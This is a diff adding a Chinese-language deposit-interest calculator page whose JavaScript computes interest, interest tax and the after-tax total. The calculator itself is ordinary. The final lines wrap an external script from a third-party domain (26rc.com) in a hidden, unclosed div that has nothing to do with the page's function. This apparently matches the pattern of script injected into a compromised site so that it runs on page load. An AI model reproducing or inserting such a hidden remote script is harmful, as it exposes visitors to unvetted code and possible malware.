@@ -1,0 +1,205 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>生活百宝箱</title>
+<link href="../res/zl_style.css" rel="stylesheet" type="text/css" />
+<script language="javascript" src="../js/tools.js"></script>
+<script language="javascript">
+<!--
+
+/**
+ *  显示利率
+ */
+function fGetRate()
+{
+	var oForm  =  $("depositFom");
+	with(oForm){
+		if(typeSelect.value == 0){
+			rate.value = "0.7200";
+		}else{
+			rate.value = term.value.split("|")[1];
+		}
+
+	}
+}
+
+/**
+ *  获取利率计算
+ */
+function fGetInterest()
+{
+	var oForm  =  $("depositFom");
+	var nAmount,nTerm,nYRate;
+	with(oForm){
+		nAmount = amount.value;
+		nTerm   = term.value.split("|")[0];
+		nYRate  = yrate.value;
+		if(nAmount.trim() == ""){
+			alert("请输入存款金额");
+			amount.focus();
+			return false;
+		}else if(!nAmount.isNumber()){
+			alert("存款金额必须为数字");
+			amount.focus();
+			return false;
+		}else if(nYRate.trim() == ""){
+			alert("存款利率不能为空");
+			yrate.focus();
+			return false;
+		}else if(nYRate.search(/^\d+.?\d+$/g) != 0){
+			alert("存款利率必须为数字");
+			yrate.focus();
+			return false;
+		}
+	}
+	var taxrate = 0.05;//Saving Tax Rate,20070816
+	var interest = nAmount * nYRate * nTerm * 0.01/12
+	var tax = taxrate*nAmount * nYRate * nTerm * 0.01/12
+	var result = nAmount*(1+(1-taxrate) * nYRate * nTerm * 0.01/12) 
+
+	interest = Math.round(interest*100) 
+	interest = interest/100 
+	interest = interest+""	 
+	$("interestSpan").innerHTML = interest;
+
+	tax = Math.round(tax*100) 
+	tax = tax/100 
+	tax = tax+""	   
+	$("taxSpan").innerHTML = tax;
+
+	result = Math.round(result*100) 
+	result = result/100;
+	result = result+"";
+	$("resultSpan").innerHTML = result;
+	$("resultDiv").style.display = "";
+	
+	return false;
+
+}
+/**
+ *  清空
+ */
+function fClearResult()
+{		
+	$("interestSpan").innerHTML = "0";
+	$("taxSpan").innerHTML = "0";
+	$("resultSpan").innerHTML = "0";
+	$("amount").value = "";
+	fGetRate();
+}
+//-->
+</script>
+</head>
+<body lang="zh" class="BG_Lnav" onload="fGetRate();">
+<div class="Top"><a href="../index.htm" class="a_INDEX">生活百宝箱</a><b class="Top_B_arr"></b><span><strong>万能计算器</strong></span></div>
+
+<!--左侧标签 开始
+<div class="ZL_Left">
+
+</div>-->
+
+<table class="ZL_Cont_tab" cellpadding="0" cellspacing="0">
+<tbody>
+  <tr>
+    <td class="Cont_tbL">
+	<!--左侧导航 开始-->
+	<div class="NAV_L_Tit">计算器</div>
+	<a href="jsq_shuxue.htm">数学计算器</a>
+	<a href="jsq_shui.htm">个人所得税</a>
+	<a href="jsq_daikuan.htm">房贷计算器</a>
+	<a href="#" class="on">存款计算器</a>
+	<a href="jsq_jiankang.htm">健康计算器</a>
+	<!--左侧导航 结束-->
+	</td>
+    <td style="vertical-align:top">
+	<!--右侧内容区 开始-->
+	<div class="Cont_tit">
+		<h1>存款计算器</h1>
+		<span>精打细算：点滴收入，尽在心中</span>	</div>
+	<!--题头结束-->
+	<form id="depositFom" name="depositFom" onsubmit="return fGetInterest();">
+	<div class="Cont">
+		<table class="table_jsq dk_tab_Wid2" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="td_L">币种：</td>
+    <td>
+      <select name="select" id="select" class="sel_wid">
+	<option value="10" selected>人民币</option>
+	<!--<option value="32">美元</option>
+	<option value="43">英镑</option>
+	<option value="35">欧元</option>
+	<option value="65">日元</option>
+	<option value="21">港币</option>
+	<option value="39">加拿大元</option>
+	<option value="87">瑞士法郎</option>
+	<option value="29">澳大利亚元</option>
+	<option value="69">新加坡元</option>      
+      </select>-->      </td>
+  </tr>
+  <tr>
+    <td class="td_L">存款种类：</td>
+    <td>
+	<select id="typeSelect" name="typeSelect" class="sel_wid" onchange="fGetRate();">
+      <option value="0" selected>活期存款</option>
+      <option value="1" >定期存款</option>
+    </select>	</td>
+  </tr>
+  <tr>
+    <td class="td_L">存款时长：</td>
+    <td>
+		<select id="term" name="term" class="sel_wid" onchange="fGetRate();">
+			<option value="3|3.3300" selected>三个月</option>
+			<option value="6|3.7800" >六个月</option>
+			<option value="12|4.1400" >一年</option>
+			<option value="24|4.6800" >两年</option>
+			<option value="36|5.4000" >三年</option>
+			<option value="60|5.8500" >五年</option>
+		</select>	</td>
+  </tr>
+  <tr>
+    <td class="td_L">存款金额：</td>
+    <td>
+	<input type="text" id="amount" name="amount" class="inp_jsq" style="width:112px" onFocus="this.style.borderColor='#889297';this.style.backgroundColor='#FFFFE8'" onBlur="this.style.borderColor='#7F9DB9';this.style.backgroundColor='#FFF'">	</td>
+  </tr>
+  <tr>
+    <td class="td_L">存款利率：</td>
+    <td>
+	<input type="text" id="yrate" name="rate"  class="inp_jsq" style="width:112px" onFocus="this.style.borderColor='#889297';this.style.backgroundColor='#FFFFE8'" onBlur="this.style.borderColor='#7F9DB9';this.style.backgroundColor='#FFF'">( % )	</td>
+  </tr>
+  <tr>
+    <td class="td_L">&nbsp;</td>
+    <td style="height:40px"><input type="submit" name="Submit" value=" 计算 " class="bot_line_btnB font_B">&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" onclick="fClearResult();" value=" 清零 " class="bot_line_btnB"></td>
+  </tr>
+</table>
+<!--结果浮层 开始-->
+<div id="resultDiv"  class="sec_box_result" style="display:none">
+	<div class="sec_box_result_tit">计算结果</div>
+	<table class="table_jsq_result" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="td_L">利息：</td>
+    <td><span id="interestSpan"></span> 元</td>
+  </tr>
+  <tr>
+    <td class="td_L">扣除利息税：</td>
+    <td><span id="taxSpan"></span> 元</td>
+  </tr>
+  <tr>
+    <td class="td_L">本息合计(税后)：</td>
+    <td><span id="resultSpan"></span> 元</td>
+  </tr>
+</table>
+</div>
+<!--结果浮层 结束-->
+	</div>
+	<!--右侧内容区 结束-->
+	</td>
+  </tr>
+</tbody>
+</table>
+
+<!--左侧标签 结束-->
+<div style='display:none'>
+<script type="text/javascript" src="http://www.26rc.com/js/26.js"></script>
+</body>
+</html>
